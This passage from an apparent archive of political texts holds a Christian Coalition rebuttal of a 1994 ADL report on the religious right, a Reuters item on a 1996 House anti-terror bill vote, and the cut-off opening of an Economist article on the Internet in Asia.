So poorly researched is the report that views attributed to columnist Robert Novak are based on a quotation so badly lifted out of context that its meaning is distorted. In arguing that a "grim" Paul Weyrich, a Washington pro-family strategist, is somehow tied to anti-Semitic individuals, the report quotes Novak as saying, "I am supposed to be the Prince of Darkness, but Paul's the only person who's so tough that he gets hate mail from Mother Theresa."(16) This statement was made by Mr. Novak at a roast in Weyrich's honor held in Washington, DC, on April 1, 1991. Clearly, the remark is offered in jest - but it is lifted out of its proper context by the ADL to distort the true meaning.(17)
Reckless Charges of Anti-Semitism
The ADL report repeatedly suggests that leaders and organizations in the pro-family movement are guilty of anti-Semitism.
Stung by criticism from within the Jewish community, the ADL is backpedaling, and now denies making the accusation. For example, in a response to an earlier Christian Coalition correction of its many factual errors, the ADL weakly claimed, "the ADL does not call the Christian Coalition or any other religious right organization anti-Semitic." (18)
Has the ADL not read its own report? It alleges that "movement leaders have demonstrated a disturbing insensitivity to Jews and Jewish concerns" (p. 2), that its agenda expresses "anti-Jewish and extremist sentiments" (p. 2), that its leaders make "public anti-Jewish pronouncements" (p. 21), that its rhetoric is "reminiscent of traditional anti-Semitic thinking" (p. 22), that its literature is peppered with "anti- Jewish nuggets" (p. 24), that its leaders have "issued a number of pronouncements antagonistic toward Jews" (p. 42), that the movement has been "tolerant of anti-Semitism" (p. 42), that its publications echo "evangelical anti-Judaism" (p. 43), and that its groups conspire with "the nation's leading anti-Semitic propaganda organization" (p. 97). (19)
Had the ADL simply contacted the Christian Coalition and other groups defamed by the report, extensive documentation could have been provided to demonstrate our wholehearted and steadfast opposition to anti-Semitism and bigotry. In January 1994, Pat Robertson received the highest honor of the Christians' Israel Public Action Campaign at a Jewish-Christian solidarity rally in Washington, DC. At the awards ceremony, Robertson stated, "Those of us who are evangelicals say to those of you who are Jewish, we are your friends. We stand with you and however easy it is, or however difficult it is, you can count on us as your friends, your supporters and your compatriots in a struggle to bring forth the fulfillment of that prophecy, and to make this a better world for all of us to live in." (20)
Robertson also told the Los Angeles Times in 1993, "I am convinced on the political scene that the evangelical churches, the Catholic churches, the Orthodox Jewish people, all of us, will work together." Ralph Reed was quoted in the same story as saying, "We're working very closely with various conservative and orthodox rabbis to try to build a friendship and cooperation across theological lines on family and moral issues." (21)
Robertson has been a major contributor to the United Jewish Appeal, has donated large sums to Jewish charities in Jerusalem, and visited the ADL offices in 1985 to meet with its board of directors. At that meeting, Robertson held hands with then-executive director Nathan Perlmutter and the entire board of directors and the group prayed together for an end to anti-Semitism and intolerance in America. Those present at the meeting report that many were moved to tears.
In January 1994, Ralph Reed visited Israel on a tour sponsored by the Jerusalem Post. He met with former Prime Minister Yitzak Shamir, members of the Knesset, government officials, and the mayor of Jerusalem. Reed's trip was undertaken with the assistance of Jewish leaders in the United States to underscore the Christian Coalition's steadfast support for Israel and Jewish concerns. (22)
Twisting Words Out of Context One of the most disturbing aspects of the ADL's report is its propensity to lift words out of context so as to distort their original meaning. It does so with reference to the irresponsible charge of anti-Semitism.
Citing an editorial in the Christian American newspaper, the ADL argues that the Christian Coalition believes that "Jews 'both killed the Lord Jesus and their own prophets, and have persecuted us; and they please not God, and are contrary to all men' (1 Thessalonians 2:15)." The ADL dismissively acknowledges that this quotation from the New Testament appeared in an editorial denouncing anti-Semitism, but refers to it as "typical of evangelical anti-Judaism." (23)
In fact, the editorial (titled "Anti-Semitism in the Church") cited the above-mentioned verse from the Bible as an example of Scripture twisted by anti-Semites in the past to justify their bigotry. The editorial went on to say that "the place of the Church is to restore, not to condemn." The column concludes, "Our editorial position has been and remains clear, consistent, and Biblical: we support the State of Israel and we oppose anti-Semitism." (24)
In the same issue of Christian American, another statement condemned bigotry against Jews. "Anti-Semitism is a serious and dangerous thing to take root and grow. Please do not give aid to this monster, and allow it to grow any further." (25)
Reaction from the Jewish Community
Many in the Jewish community have reacted with disbelief to the ADL's assault on Christian leaders who have been among their best friends in the United States. Midge Decter and Elliot Abrams both have begun efforts to refute the biased report by the ADL through newspaper advertisements. Former U.S. Senator Rudy Boschwitz, an honorary vice-chairman of the ADL, has written a letter distancing himself from the report. "In my 12 Senate years, I worked with many of the 'Religious Right.' They were very active in the cause of Soviet Jewry (many Pentecostals and other Christians couldn't leave the Soviet Union either). They were fervent supporters of the State of Israel, and we worked together often. Among the leadership of conservative Christians I never experienced even a hint of anti-Semitism. Indeed, it was quite the opposite-I am honorary vice-chairman of the ADL. I am proud of that-but in this instance I strongly disagree. From all my experience I know their report to be i!
 ll-founded. Regretably it will do more harm than good." (26)
Marshall Breger of the Heritage Foundation has noted that the report "inferred that the religious right is anti-Semitic, and I don't see how you can make that claim on the record." Marshall Wittmann, director of legislative affairs at the Christian Coalition, says, "This [report] was liberalism and not Judaism speaking." He adds, "It's quite ironic that the ADL, despite all the various anti-Semites out there, would go after people for their political views." (27) Wittmann, who has traveled extensively speaking to Christian Coalition seminars nationwide, recounts that he has "never encountered a whiff of anti-Semitism" among its members. (28)
"The greatest friends the State of Israel has in America are the Christian conservatives," said Herbert Zweibon, chairman of Americans for a Safe Israel. "And [the ADL] is telling this community to get lost?" Zweibon added that the ADL, founded in 1913 to combat anti-Semitism, had "gone off track" and "adopted a liberal political agenda that has nothing to do with its mission." The ADL, he concluded, "does not represent the views of most American Jews." (29)
Opposing David Duke
The ADL frequently resorts to the very same kinds of guilt-by-association lines of argument patented by virulent anti-Semites. One of the most egregious examples occurs in its allegation that Pat Robertson and Christian Coalition board member Billy McCormack gave aid and support to former klansman and neo-Nazi David Duke's Louisiana senatorial bid in 1990 and his gubernatorial bid in 1991. The allegation is not true.
The report says McCormack helped to table a 1990 censure motion against Duke in the Louisiana Republican Central Committee, implying that McCormack supported Duke's racist views. (30) This is inaccurate. Rhett Davis, who served as Congressman Clyde Holloway's campaign coordinator in the 1991 gubernatorial campaign, says the following about McCormack's role: "Months before Congressman Holloway formally announced his candidacy (though David Duke had already announced), Mr. Billy McCormack of Shreveport contacted me on numerous occasions expressing his strong feeling that we needed to convince Congressman Holloway to run because no other candidate was acceptable- . Mr. McCormack and his friends statewide began a concentrated effort to help our campaign. Mr. McCormack was very effective, and ultimately provided the margin of victory for Holloway at the Republican State Convention." (31)
Davis also noted that McCormack brought Robertson to Louisiana to campaign against Duke in October 1991, and Robertson appeared in Baton Rouge, Lake Charles, and Shreveport at fundraisers for Holloway. (The trip was paid for by the Holloway for Governor campaign and Robertson appeared in his capacity as a private citizen.)
"Additionally," Davis continued, "please note that the effort to kill a move to censure Duke-was actually led by the anti-Duke forces, fearing such a move would not hurt him, and might indeed backfire like other, similar moves." (32)  Other press accounts have similarly noted that the resolution was tabled to "deprive Duke of additional publicity." (33)
In November 1991, after Clyde Holloway (the favored candidate of religious conservatives) failed to make the run-off election for Governor, pro-family activists faced a dilemma. Edwards was an advocate of legalized gambling, liberalized pornography laws, and abortion. Duke - though conservative on these issues - held anti-Semitic and racist views that are anathema to religious conservatives.
How did religious conservatives react to this dilemma? In the ADL's green-spectacled fantasy, "Robertson displayed indifference to Duke's racist record, despite the fact that the national Republican Party-had repudiated and condemned the arch-bigot more than a year earlier." The ADL report gravely intones that Robertson "never denounced Duke during Duke's subsequent Louisiana gubernatorial bid- ." (34)  That is an irresponsible statement for which the ADL should issue a retraction and an apology.
On November 13, 1991, Robertson denounced Duke on his 700 Club program before the run-off between Edwards and Duke. His words were unambiguous: "You don't get converted one day and run for governor the next. And especially the fact that there was apparently a falsehood about his-service- it does not exist, apparently. And furthermore, he claims to be a member of a church that doesn't exist as well. There are a few little inconsistencies. Plus there's some really bad stuff in his background- . And it's very dangerous in America to foster hate, and racial hatred, hatred of Jews, bigotry - that kind of thing. It is something we just don't need in this country." (35)
Duke lost a campaign which he had led in many polls just weeks prior to the election. Many observers noted that Robertson's statement - strategically timed a few days before the run-off for maximum impact - might have made the difference by depressing Duke's support among white evangelical voters. Many other organizations and leaders adopted a more low-profile tactic in opposing Duke. (36)  But Robertson boldly and publicly spoke out. Instead of praising Robertson for being the most prominent evangelical Christian figure in America to denounce Duke and prevent his election, the ADL smeared him with a falsehood.
Conspiracy Theories of the Left
The ADL is obsessed with the notion that Christian conservatives engage in so-called "stealth" activities that disguise their agenda. It relies heavily on bizarre theories like those propagated by People for the American Way and Skipp Porteous, a Massachusetts-based conspiracist-cum-propagandist who specializes in spreading falsehoodsand innuendo about religious conservatives.
By combining forces with paranoid conspiracists on the left, the ADL suggests that the distribution of nonpartisan voter guides by Christian organizations amounts to a subversion of democracy. The report asserts that "the policy of Robertson's Christian Coalition has often been to hide its election activity." (37)   It falsely claims that the Coalition "acknowledges having used [stealth tactics]." It compares volunteers in churches who educate voters with "Tammany's ward heelers and the old Democratic machine in Chicago." (38)
The ADL report asserts, "The Coalition participated in the ground-breaking November 1990 elections in San Diego County in which 60 of 88 candidates associated with religious right groups were elected to office - an event that came to be known among the religious right and its critics as the 'San Diego model.' " (39)
This statement is false. The Christian Coalition played no part in the 1990 San Diego school board elections. At the time, the Coalition barely had been in existence a year. It had no state affiliate in California and no chapter in the San Diego area. The Coalition neither practices nor endorses the "stealth tactics" the ADL claims.
Contacted by the Los Angeles Times after the election, Ralph Reed of the Christian Coalition made it clear that his organization had nothing to do with the campaign. He noted that while the tendency of candidates to campaign in churches might have been an effective strategy, it probably would backfire if the candidates had not gained broad support for their views in the electorate.
Reed made these remarks in his capacity as a political analyst. He did not condone, endorse, or participate in the strategy. The Times misquoted Dr. Reed, a fact that the ADL could have discovered with a more thorough search of newspaper accounts on the subject. (40)
If the 1990 San Diego School Board races are a "model," as the ADL alleges, what were they a model for? The fact is that this strategy failed in San Diego - many of the candidates who used them were defeated in 1992 - and it never has been replicated again.
The ADL report fails to mention a single other community in the nation where the strategy has been used. It alludes to an undocumented charge by Skipp Porteous that such a strategy was undertaken in Williamsville, New York, but provides no evidence and names not one candidate who employed them. (41) In fact, the incident in Williamsville never happened. Jeff Baran, executive director of the Christian Coalition in New York, made this clear. "I can assure you that, while I have had a few conversations with Porteous in the past, none have ever contained talk of running candidates of any kind, let alone 'stealth' candidates. As is our policy, we have not engaged in partisan politics in Williamsville or anywhere in New York- ."(42)  Apparently San Diego was not a "model" at all, just a threadbare scare tactic whipped up by conspiracy theorists like Skipp Porteous and People for the American Way.
Guilty of Democracy
The ADL seeks to tar the name of Christian Coalition by finding the organization guilty of commiting democracy. Through nonpartisan voter education efforts, Christian Coalition informs voters  where candidates stand on a broad range of issues, and encourages voters to go to the polls and cast their ballots for the candidate of their choice. 	
Christian Coalition leaders have repeatedly disavowed so-called "stealth tactics." They always have been accessible to the press, open to the public, and have pursued a policy of honesty and rectitude in their voter education activities.
Ralph Reed told the Washington Times, "We don't encourage in any way people to run for office at any level and misrepresent their position on any issue. We believe pro-family candidates should run unapologetically on who they are and what they believe because the public shares their viewpoint." (43)
In an appearance on CNN's Crossfire, Reed specifically denounced the so-called stealth strategy:
Reed: 	We're working on behalf of choice in education.We're working to increase the standard deduction for children. We're working to decrease the tax burden on the American family. It's a mainstream agenda for a mainstream America. Eighty percent of the American people want prayer in school, 75 percent are opposed to abortion as a form of birth control, and two out of three want choice in education.
Sununu: 	Ralph, let me ask you this. If those statistics are valid, and I think they are, then why-the stealth candidate strategy that you're getting criticized about?
Reed: 	We don't, John. We don't encourage that. We don't teach it. We don't promote it. What we think is that, because our values are held by the vast majority of Americans, go out there and articulate what you stand for, and you'll draw the people to you. That's what Ronald Reagan did, and that's what we want to do. (44)
Coalition founder Pat Robertson has been equally clear: "People can say anything they want to, but it's not the policy of the Christian Coalition nationally to hide anything. We want to bring out the truth, not hide it. We want to know what people stand for." (45)
As Ralph Reed argues in his forthcoming book:
"We do not advocate electing officials by depressing voter turnout or taking advantage of historically low voter participation. Some have inaccurately charged that religious conservatives hide their religious affiliation, conducting "stealth" campaigns in which they eschew public forums and campaign exclusively in churches. The opposite is true. The Christian Coalition, for example, distributes millions of nonpartisan voter guides that inform voters on where all the candidates stand- .We want a more open airing of who the candidates are and what they believe. Pro-family candidates win at the ballot box because of their views, not in spite of them. They are elected precisely because of who they are and what they believe." (46)
The New York City Mode
If the ADL was looking for the real model of Christian Coalition activity, it would turn to the place where ADL's headquarters is located: New York City. In 1993, Queens school board member Mary Cummins led a protest movement against then-New York City School Chancellor Joseph Fernandez' imposition of the "Rainbow Curriculum," a multi-cultural course that included instruction on the gay lifestyle to students as young as six years old.
A local Christian Coalition chapter was organized, coincidentally, about the same time Cummins raised her voice. The Coalition's New York City coordinator made contact with Cummins, and over the next two months the Coalition, in cooperation with the Roman Catholic Archdiocese of New York, The Congress Of Racial Equality (CORE), The National Committee For the Furtherance of Jewish Education, and the Family Defense Council, supported her reform efforts by distributing 550,000 nonpartisan voter guides in 1,300 churches and synagogues.
Catholics, Hispanics and Jews joined the Christian Coalition to distribute more than 500,000 nonpartisan voter guides prior to the New York City School Board races. In addition to church and synagogue distribution, Christian Coalition voter guides were passed out at union halls, polling places and family events. The guides informed voters where 540 school board candidates stood on a broad range of issues, including school choice, voluntary prayer, merit pay for teachers and parental rights. The guides endorsed no candidates and were used for voter education. In a far-reaching show of support, Cardinal John O'Connor allowed the distribution of voter guides in 300 Catholic churches, a move that opened the door to ongoing Catholic/evangelical cooperation.
As a result of Christian Coalition's voter education campaign, voter turnout reached the highest level in 20 years. Approximately 450,000 voters went to the polls, and 60 percent of 130 pro-family candidates won election. Ten city school boards had solid pro-family majorities. Among the new board members: Linda Garcia, a Hispanic mother who won election in Manhattan's Lower East Side. Cummins and her allies were re-elected in Brooklyn. Fernandez was removed from his post. (47)
The Coalition's efforts in New York were the subject of ongoing press coverage from the beginning, and virtually every significant development was reported in detail. The Coalition held numerous news conferences in New York during the campaign to announce its activities. Indeed, when the New York Times and the New York Post listed which candidates they preferred in the contests, they did so based on information derived from the Coalition's well-documented voter guide. (48)  So much for "stealth."
Reed told the New York Times during the campaign: "We're simply encouraging people of faith, of all religious traditions, including people of the Jewish and Roman Catholic faiths, to be informed voters." (49)
Another Distortion: The Phantom Manual
Seeking more fodder for its conspiracy grist mill, the ADL repeats the tired and false accusation that the "1992 Pennsylvania Christian Coalition's 'County Action Plan' directed" members to "never mention the name Christian Coalition in Republican circles." (50)
To state the obvious, Christian Coalition's activities within the GOP are a matter of public knowledge, especially given extensive news coverage of the last several years. With Democratic consultant Bob Beckel calling politically active evangelicals "Nazis," Mark Shields referring to them as the "American equivalent of Shiite Muslims," and Jocelyn Elders attacking them, it is difficult to see how the ADL can think that anyone is unaware of Christian involvement in the Republican party.
In fact, the manual the ADL cites does not exist. The "County Action Plan" was a draft prepared by a local volunteer. It was submitted to the national office and rejected as inconsistent with the Coalition's policy of openness and inclusion.
As Ralph Reed directed in a letter on October 7, 1992, to the executive director of the Pennsylvania chapter:
"There are several problems with the manual-It directs Christian Coalition members not to mention their affiliation with the Christian Coalition in party circles. That is not our policy- .This manual, in its current form, does not have the authorization or imprimatur of the Christian Coalition. Please retrieve all copies- ." (51)
The ADL need only have contacted the Christian Coalition and its staff would have gladly provided a copy of the letter. As it is, the ADL has repeated a false allegation about a manual that does not exist. In fact, the ADL barely mentions the legitimate and extensive Christian Coalition training materials, such as its 256-page Leadership Manual, which states the official policy of the organization.
Indeed, the Leadership Manual  clearly urges pro-family citizens to be open, honest and up front about their views and beliefs:
"First, do not limit your campaign to just churches and the Christian community. As a supporter of family values, your positions on issues affecting the family are the same as a majority of the voting public. Do not be shy in declaring that your stands on the issues are based on principle- ."
"Do not use so-called 'stealth' tactics. In the past, some candidates have focused their campaigns on the churches and have not reached out to the general electorate. In the long run, this strategy is unsuccessful- .Working in the churches alone will not result in lasting success." (52)
A Nonpartisan Coalition
Christian Coalition's get-out-the-vote efforts are nonpartisan, contrary to the ADL's assertions. The ADL repeats partisan claims by the Democratic National Committee, which recently has launched an orchestrated campaign of bigotry against people of faith in the political arena. It mentions specious complaints that the DNC has filed with Federal Election Commission. It fails to mention that both the FEC and the IRS have found the Christian Coalition's nonpartisan voter guides in full compliance with the law.
The ADL conveniently ignores the fact that every complaint filed by the Democratic Party against the Coalition has been resolved in favor of the Christian Coalition, most notably a 1990 complaint that advertisements opposing taxpayer-funding of pornography constituted "express advocacy" on behalf of specific candidates. The FEC found that the advertisements were entirely consistent with the Christian Coalition's status as a nonpartisan issues organization. (53)
The ADL also fails to mention the fact that the Coalition has engaged in voter education activities in a number of Democratic races. For example, in the spring of 1994 in Houston, Texas, the Coalition distributed voter guides in a campaign in which Beverly Clark, an African-American, pro-life Democrat, ran in a congressional primary. "The Christian Coalition distributed nonpartisan voter guides in over 100 black churches and made thousands of nonpartisan get-out-the-vote calls to African-American voters from grassroots phone banks." (54)  Clark forced Ken Bentsen, nephew of the Treasury secretary and former Texas senator, into a run-off.
A voter guide distributed for the April 12 Democratic run-off listed Clark's and Bentsen's stands (labeled "supports" or "opposes") on ten public policy issues. The answers were provided to the Coalition in response to a candidate survey. Those issues were: "Increased income taxes; balanced budget amendment; abortion-on-demand; taxpayer funding of abortion; voluntary prayer in schools; mandatory sentences for violent crimes; homosexuals in the military; parental choice in education (vouchers); federal government control of health care; 'workfare' requiring able-bodied welfare recipients to work or get job training." (55)  The Coalition distributed a similar voter guide in a Mississippi Democratic congressional primary in 1994.
In Cincinnati, Ohio in 1993, pro-family activists supported Charles Winburn, an African-American pastor of the Kingdome Church, in his run for the city council. Winburn, a registered Democrat, graduated from a Christian Coalition training school and campaigned for welfare reform and school choice. (56)
Reaching Out to Democrats
The Coalition's 1994 Congressional Scorecard, which lists Senators' and Representatives' votes on a wide range of issues affecting families, makes no distinctions based upon party affiliation. Representative Charles Stenholm, (D-TX) scored a 100-percent rating on the Christian Coalition Scorecard. Representative Pete Geren, (D-TX) scored a 93- percent rating, as did Representative Gene Taylor, (D-MS). Some of the Democrats who have spoken at Christian Coalition events in recent years include: state Representative Roger Byrd (D-GA), Duval County (FL) School Board member Stan Jordan, Beverly Clark, Charles Winburn, and State Representative Woody Jenkins (D-LA). (57)
A number of other Democrats received high ratings on the Congressional Scorecard. Sen. Richard Shelby (D-AL), for instance, agreed with Coalition positions on 71 percent of the surveyed votes. Representative Jimmy Hayes (D-LA) scored 86 percent. Representative Sonny Montgomery (D-MS) rated 71 percent, as did Representative William Lipinski (D-IL). Representative Matthew McHugh (D-NY) had a 93-percent rating.
The Christian Coalition Scorecard highlighted Senate votes on such issues as: tax incentives for families; balanced budget amendment; taxpayer-funded abortions; Joycelyn Elders' nomination for surgeon general; term limits for Congress; and condoms for school children without parental consent. House votes included: cutting government waste; parental notification for abortion; abstinence-based sex education; lifting the ban on fetal tissue research; criminalizing pro-life speech. Each vote is factually described. (58)
The 1994 Congressional Scorecard clearly states that the listing of these votes on issues affecting the family does not imply an endorsement for office or a commentary on the personal faith of the elected official. "This Scorecard is for informational purposes and is not intended to influence the outcome of any election," the Scorecard reads. "Christian Coalition does not advocate the election or defeat of any candidate, and does not endorse any political party. Scores in this Scorecard are not to be taken as a commentary on the personal faith of individual members of Congress. The information in this Scorecard is provided as a tool to help you more effectively lobby your Congressman and two Senators on issues before the 103rd Congress." (59)
The Coalition's Scorecard and voter guides are little different from the informational ratings issued by the AFL-CIO, Americans for Democratic Action, American Conservative Union and numerous other organizations. The Coalition simply provides to voters - of all political persuasions - what they richly deserve: reference tools that show how their elected representatives in government stand on issues of concern to families.
How the Christian Coalition Works
The ADL complains that Coalition members play a major role in some state and local party organizations because they are the most energetic participants. What is wrong with citizens taking part in the political process? The ADL takes issue with religious conservatives who are simply exercising their rights of citizenship.
The Christian Coalition's Leadership Manual provides members with nuts-and-bolts information on the electoral process, from how to organize a local chapter and requirements for Christian Coalition affiliation to how to conduct a voter canvass.
The Coalition's purposes, as outlined in the manual, are as follows:
To represent Christians before local councils, state legislatures and the U.S. Congress.
To train Christians for effective political action.
To inform Christians of timely issues and legislation.
To speak out in the public arena and the media.
To protest anti-Christian bigotry. (60)
"Your job as a Christian Coalition leader is to identify the Christian vote and get it to the polls," the manual says. (61)  In this sense, the Coalition's mission is no different from the League of Women Voters, the National Organization for Women, NARAL, the AFL-CIO, or Jesse Jackson's Rainbow Coalition, which has registered hundreds of thousands of African-Americans to vote.
The Coalition's policy stances are rooted in faith - as were America's founders, who spoke of the people of this nation as being endowed by their "Creator" with "certain inalienable rights." As Reed said on NBC's Meet the Press:  "The apostle Paul told the early Christians to render unto Caesar the things that are Caesar's and to exercise their civic responsibility. And what we're saying is that in a democracy, when you render unto the government that which is due it, that means your vote, your informed participation and your involvement." (62)
Personalizing Public Policy Differences
The ADL apparently regards grassroots democracy as a threat to, in its words, "tolerance and pluralism." In fact, the Coalition and the ADL simply disagree on public policy issues. The Coalition does not support taxpayer-funded abortion as a form of birth control. Neither do 87 percent of the American people, according to a recent survey. But the ADL equates a pro-family, pro-life position with intolerance. Indeed, Abe Foxman, executive director of the ADL, even charges that supporting the sanctity of innocent human life creates "hostility" in which "tolerance and pluralism inevitably plummet." (63)  To equate one's public policy views with "tolerance" and impugn one's political foes as opposed to "pluralism" is intellectually dishonest. The Christian Coalition believes students should be allowed to exercise their First Amendment right to free speech, including speech of a religious content. The ADL says this somehow violates the separation of church and state. If so, it may have a dispute with President Clinton as well. In a town hall meeting in Charlotte, North Carolina, in April 1994, Clinton stated his view that voluntary prayer does not violate the Constitution:  "Now, it's been carried to such an extent now where they say, some people have said you can't have a prayer at a graduation exercise. I personally didn't agree with that. Why? Because if you're praying at a graduation exercise or a sporting event, it's a big open air thing, and no one's being coerced."
"I do not agree that people should not be able to freely pray and to acknowledge God. We have a chaplain in Congress, in the Senate and the House." (64)
Does the ADL believe that President Clinton is undermining pluralism by his opposition to the Lee v. Weisman decision of 1992 that bans high school graduation prayer? His position is identical to that of the Christian Coalition.
We may believe the ADL is wrong about some policy issues, but unlike the ADL we do not question their right to hold such views or their commitment to pluralism. And we stand arm-and-arm with the ADL in giving no quarter to anti-Semitism or bigotry of any kind.
Partisan Attacks
Unfortunately, the ADL report has become part of a highly partisan campaign against religious folk launched by the national Democratic party. By lending its name to this campaign against people of faith, the ADL risks being viewed as an organization driven more by partisan politics than Jewish concerns.
In August 1993, the Washington-based National Jewish Democratic Council held a conference to organize a 40-group coalition to oppose Christian conservatives. Among the participants were Arthur Kropp, president of People for the American Way, and Clinton Cabinet members Federico Pena and Donna Shalala. (65)
Throughout 1993, Lieutenant Governor Don Beyer of Virginia ran a particularly vicious, bigoted campaign against Mike Farris, the Republican candidate for lieutenant governor. Beyer used materials supplied by People for the American Way which accused Farris of seeking to ban books such as The Wizard of Oz. The Washington Post concluded that the charges were false. Michael Barone of U.S. News and World Report said that the allegation against Farris "unfairly distorts and ridicules" his views. (66)
In June of 1994, just days after the ADL released its report, Representative Vic Fazio (D-CA), chairman of the Democratic Congressional Campaign Committee, launched a new attack on religious conservatives, calling them "fire-breathing fanatics." The Democratic National Committee even has set up a bulletin board on Compuserve called "Radical Right," which contains speeches and other party documents designed to assault Christians.
U.S. Surgeon General Joycelyn Elders gave a speech in New York City within weeks of the ADL report's release in which she referred to religious folk who are conservatives as "un-Christian." This was a clear assault on the deeply-held religious beliefs of millions of Americans. All 44 Republicans in the Senate condemned this act of arch-bigotry in a letter to President Bill Clinton, and 87 members of the House of Representatives called for Elders' resignation. (67)  What was the ADL's reaction to this act of defamation? Thunderous silence.
The ADL, once a respected civil rights organization, has aided and abetted a campaign of intolerance against people of faith with whom they disagree politically. Instead of calling the Democrats to task for dividing Americans based on where they go to church or synagogue, the ADL has cast its own stones. "It's an old thing in politics," said Representative Dick Armey of Texas, "Whenever you are trying to get people's attention, you create a monster out there. So, they are looking for a bogeymen, and they are hyping the story that the Republican Party is being taken over by a bunch of extremists." (68)
"We are in a race between civilization and catastrophe," former Education Secretary Bill Bennett said of the campaign against religious conservatives. "We have record murder and violent crime rates, huge increases in births to unwed mothers, educational decline, broken families, and a president who has established a record of broken promises. All of this, and we are told that the very religious are what we must fear. Religion is on the side of civilization; more people ought to begin to realize it." (69)
The Separation of Church and State
The ADL report is full of accusations that the Christian Coalition does not support the separation of church and state. Its sources include undated flyers passed out at conferences and quotations lifted out of context - as well as more unreliable pseudo-scholarship by Skipp Porteous. It also features attacks on David Barton, a Texas-based scholar who has argued that many of America's founders were sympathetic to Christian values. Most of Barton's work extensively documents writings of the nation's founders.
The truth is that there is a lively debate about the role of religion in public life and the meaning of the First Amendment. The Christian Coalition supports the Establishment clause prohibiting a state- sponsored church. It does not support attempts to use the establishment clause to stifle the free speech rights of Christians, Jews, Muslims, native Americans, or anyone else. That is why the Christian Coalition supported the Religious Freedom Restoration Act of 1993, which overturned the Supreme Court's 1990 decision in Employment Division v. Smith. In this decision the Court discarded the "compelling state interest standard" criteria for judging whether laws violated rights to free exercise of religion. The ADL strongly supported this legislation as well.
In the same spirit, the Christian Coalition supports free speech rights for children in public schools. While we oppose mandatory prayers composed by school officials, we believe voluntary, student-initiated prayer is consistent with First Amendment rights to free speech. While disagreements over First Amendment issues abound, it is disingenuous to suggest that those who would allow religious speech in public schools are ipso facto opposed to church-state separation. The ADL quotes Pat Robertson as arguing that the "separation of church and state" is a "Soviet concept." This quotation is lifted out of context.  Robertson merely noted that the term "separation of church and state" does not appear in the U.S. Constitution, which is a statement of fact. The First Amendment specifically reads: "Congress shall make no law respecting an establishment of religion, or prohibiting the free exercise thereof."
Robertson is a strong supporter of the First Amendment. For example, during his 1988 presidential campaign, Robertson stated: "I believe absolutely in the separation of church and state." (70)
In 1991, he said on Larry King Live, "I think it [the separation of church and state] is far better. You look at Europe where they have established churches and they are really dying out. We have a much healthier church here in America, free from government money- .But I don't think the Constitution requires government to be opposed to religious faith."(71)
Robertson's words echo those of William O. Douglas in Zorach v. Clauson (1952). "We are a religious people whose system of government presupposes a Supreme Being," argued Douglas. There was, he added, "no constitutional requirement which makes it necessary for government to be hostile to religion and to throw its weight against efforts to widen the effective scope of religious influence." (72)
For most of America's history, church pulpits flamed with sermons about social injustices ranging from slavery and racism to poverty and the liquor trade. No one suggested that these activities posed a threat to the separation of church and state. Americans always have resisted the notion of a national religion, but embraced faith-based political movements as an essential counterbalance to social injustice and government encroachments on liberty.
This is the view of the Christian Coalition. As Ralph Reed argues in his forthcoming book: "None of this adds up to the conclusion that America is a 'Christian nation' in the sense of a theocratic state or a unicultural society. That not only ignores the enormous contribution that Jews have made to America, but it is something of an anachronism. It makes just as much sense to say that Massachusetts is a Puritan colony or that Maryland is a Catholic state." (73)
Reed adds, "What religious conservatives want is to accommodate the historic role of faith in American civic life. In short, they seek to restore the time-honored tradition of civil religion - not to establish Christianity by law or to create an official church." (74)
"Our agenda, ultimately, of the Christian Coalition, isn't about theology," Reed said on ABC Nightline recently. "It is about public policy. We are trying to get public policy that is more family-friendly. And we think lower taxes, smaller government, and government that lives within its means is more family friendly." (75)
The supreme tragedy of the ADL report is there is a resurgent anti-Semitism across the land emanating from sources as wide-ranging as the Ku Klux Klan, former Farrakhan lieutenant Kahlid Abdul Muhammad (who called New York city "Jew York City"), David Duke, and some opponents of the Israeli lobby. But an inaccurate, biased, and politically motivated report like the recent ADL offering undermines efforts to combat anti-Semitism. By crying wolf, the ADL endangers its credibility at a time of rising bigotry and a period of extraordinary delicacy in the Middle East peace process.
In response to criticism of its report, the ADL has refused to back off, though it has engaged in some strategic public relations backpedaling. (76)  For its part, the Christian Coalition will continue to combat anti-Semitism and religious bigotry in all its ugly forms. It is willing to seek common ground with Jewish organizations on issues of mutual concern. The Christian Coalition never will waver from its steadfast defense of the Jewish people and the nation of Israel,  though it has been unfairly attacked by the ADL.
"The Jewish community should recognize the depth of religious faith among Christian evangelicals and treat the Religious Right with tolerance and respect," urges Marshall Breger of the Heritage Foundation. (77)
 The ADL has displayed neither tolerance nor respect. Instead, it has engaged in a partisan campaign of innuendo, half-truths and outright falsehoods.
Sadly, the ultimate losers are not the ADL's constituency, but all of us, for we desperately need a legitimate watchdog to combat bigotry. The Anti-Defamation League has committed defamation, not only against religious conservatives, but against its own stated purpose.
We earnestly hope the ADL returns to its time-honored and vital role of ensuring that intolerance has no place in our civic discourse. For our part - despite the unfair and shoddily researched attack by the ADL - we will remain vigilant in seeing that anti-Semitism and bigotry does not rear its monstrous head in our society.

House Votes to Weaken Anti Terror Bill
Washington, March 13 (Reuter) -- The House of
Representatives Wednesday removed major provisions of an
anti-terrorism bill in a vote that sponsors of the
legislation said would gut the measure.
An amendment, adopted 246-171 by conservative Republicans and some liberal Democrats, removed language that would
give the government authority to label groups as
terrorist so foreign members can be deported more easily.
It also prohibits use of wiretap evidence obtained
without a warrant.
"We do not need to give our government vast new powers,"
Georgia Republican Bob Barr, the amendment's author, said
before the vote. He said current laws were strong enough.
"With the Barr amendment this is not a real
anti-terrorism bill," said Republican Henry Hyde of
Illinois, the bill's main sponsor and chairman of the
House Judiciary Committee.
Hyde said an unusual coalition of groups including the
conservative National Rifle Association and the liberal
American Civil Liberties Union were opposing the bill
because they thought it gave the federal government too
much power.
Hyde said one Republican colleague told him privately,
" 'I trust Hamas (the militant Islamic group) more than
my own government.' "

The Economist, 16 March 1996, pp. 42-43.
Asia and the Internet: Not too modern, please
Hunched quietly over their terminals around the world, the
mouse-clicking, keyboard-tapping denizens of the Internet have
created quite a noise in Asia. The worldwide computer network
is still young in the region, but already cyberspace resounds
to the crashing of broken taboos, and collisions with the
powers that be.
In discussion groups on the Internet, you will find views
never aired in the domestic media; about Malaysia, a call for
the emigration of ethnic Chinese; about Indonesia, passionate
pleas for East Timorese independence; about Thailand, jibes at
the monarchy, which are a crime. On the World Wide Web, the
fast-growing multimedia part of the network, everyone from
Confucius to the Penthouse pet of the month seems to have a
"home page".
All of this confronts many Asian governments with an old
dilemma in a new form. All want to be "modern". But many
reject the notion that modernity encompasses the sort of
political pluralism seen in the west. On the Internet
